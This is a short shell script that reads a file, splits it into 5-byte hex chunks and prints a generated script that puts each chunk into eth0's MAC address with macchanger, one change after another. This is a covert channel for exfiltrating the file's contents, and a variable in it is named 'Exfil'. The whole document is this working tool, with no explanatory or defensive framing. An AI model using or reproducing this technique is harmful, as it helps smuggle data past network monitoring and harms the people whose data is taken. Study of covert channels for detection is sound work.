 #!/bin/sh
echo " #!/bin/sh"
for bytes in `xxd -p -c 5 $1 | sed 's/../&:/g'`; 
 do
   Exfil=`echo $bytes | sed 's/:$/ /'`
   text=`echo $Exfil | xxd -r -p`
   echo "#Injecting text: " \"$text\" to Mac via Address 00:$Exfil   
   echo "sudo ifconfig eth0 down; sudo macchanger -m " 00:$Exfil  " eth0; sudo ifconfig eth0 up; sleep 2;"
   echo  
 done
